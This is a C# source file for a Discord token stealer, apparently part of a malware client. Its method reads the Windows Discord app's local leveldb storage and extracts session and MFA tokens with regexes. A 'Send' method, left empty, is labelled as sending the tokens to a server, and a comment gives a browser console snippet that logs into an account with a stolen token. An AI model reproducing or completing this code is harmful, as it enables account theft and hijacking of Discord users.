using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Client.Armitage.Cookies
{
    public class DiscordToken
    {
        /// <summary>
        /// Steals discord token from the Windows app.
        /// </summary>
        public List<string> Stealu() {

            List<string> discordtokens = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    discordtokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                    discordtokens.Add(match.Value + "\n");
            }

            Debug.WriteLine(discordtokens);

            return discordtokens.ToList();
        }

        /// <summary>
        /// Sends the discord token to the server.
        /// </summary>
        public void Send() { 
        
        }

        /*
        To log in:
            Open Debug on browser.
                > function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }
                > login("token")
         */
    }
}
